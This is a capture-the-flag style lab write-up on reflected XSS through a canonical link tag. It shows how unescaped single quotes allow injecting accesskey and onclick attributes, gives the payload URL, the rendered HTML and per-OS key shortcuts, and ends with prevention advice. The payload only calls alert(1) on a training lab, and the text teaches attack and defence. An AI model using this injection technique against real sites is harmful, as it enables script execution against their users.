# Lab 17: Reflected XSS in canonical link tag

**Goal**: Inject a key combination access key attribute into a `<link rel="canonical">` tag that triggers `alert(1)` when the victim presses keyboard shortcuts (`ALT+SHIFT+X`, `CTRL+ALT+X`, or `Alt+X`).

This lab reflects user input inside a `<link rel="canonical" href="...">` element in the HTML `<head>`. Angle brackets (`<`, `>`) are HTML-encoded, but single quotes (`'`) are unescaped. This allows us to inject attributes like `accesskey` and `onclick` directly into the `<link>` tag.

*Note: This specific exploitation vector relies on Chrome browser behavior.*

---

## 🎯 Solution

1. Append URL query parameters to inject `accesskey` and `onclick` attributes into the canonical link tag:
   ```http
   /?'accesskey='x'onclick='alert(1)
   ```
2. Full target URL:
   ```http
   https://<YOUR-LAB-ID>.web-security-academy.net/?'accesskey='x'onclick='alert(1)
   ```
3. Press the corresponding key combination in Chrome to fire `alert(1)`:
   - **Windows**: `ALT + SHIFT + X`
   - **macOS**: `CTRL + ALT + X`
   - **Linux**: `Alt + X`

![Lab 17 Access Key Execution](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20172052.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Analyze Canonical Link Reflection
Navigate to the homepage and inspect the HTML `<head>` source code:

```html
<link rel="canonical" href="https://your-lab-id.web-security-academy.net/"/>
```

When query parameters are appended to the URL (e.g. `/?test`), the application reflects the query string directly inside the `href` attribute:

```html
<link rel="canonical" href="https://your-lab-id.web-security-academy.net/?test"/>
```

- Angle brackets are HTML-encoded.
- Single quotes (`'`) are **NOT** escaped!

### Step 2: Inject Accesskey Attribute
To break out of `href='...'` and inject interactive event handlers, construct the payload:

```http
?'accesskey='x'onclick='alert(1)
```

When processed by the server, the rendered HTML becomes:

```html
<link rel="canonical" href="https://your-lab-id.web-security-academy.net/?' accesskey='x' onclick='alert(1)'/>
```

#### Attribute Breakdown:
- `'`: Closes the `href` attribute string.
- `accesskey='x'`: Defines `X` as the global keyboard shortcut trigger key.
- `onclick='alert(1)'`: JavaScript handler executed when the accesskey shortcut is pressed.

### Step 3: Trigger Payload Execution
Load the crafted URL in Chrome:

```http
https://<YOUR-LAB-ID>.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```

Press the platform-specific shortcut key:
- **Windows**: `ALT + SHIFT + X`
- **macOS**: `CTRL + ALT + X`
- **Linux**: `Alt + X`

Chrome triggers the `onclick` handler on the canonical `<link>` element and displays `alert(1)`:

![Lab 17 Solved Confirmation](../../Image%20Asset/Cross-Site%20Scripting/Screenshot%202026-09-26%20172052.png)

> [!SUCCESS]
> **Lab Solved**: Successfully executed `alert(1)` via accesskey shortcut on canonical link element!

---

## 💡 Key Takeaways: Hidden Element Accesskey Exploitation

- **Hidden Element Interaction**: Elements in `<head>` (such as `<link>` or `<meta>`) are invisible on the rendered page, preventing mouse clicks. Injecting `accesskey` attributes allows attackers to bind keyboard shortcuts to invisible elements.
- **Unescaped Quotes in URLs**: Reflecting raw request URLs inside HTML attributes without quote escaping creates attribute injection vulnerabilities.

---

## 🔒 Prevention

> [!TIP]
> 1. **URL & Attribute Encoding**: Properly HTML entity-encode single quotes (`'` to `&#39;`) and double quotes (`"` to `&quot;`) inside canonical link attributes.
> 2. **Canonical URL Normalization**: Sanitize canonical URL values server-side rather than echoing raw request query strings.
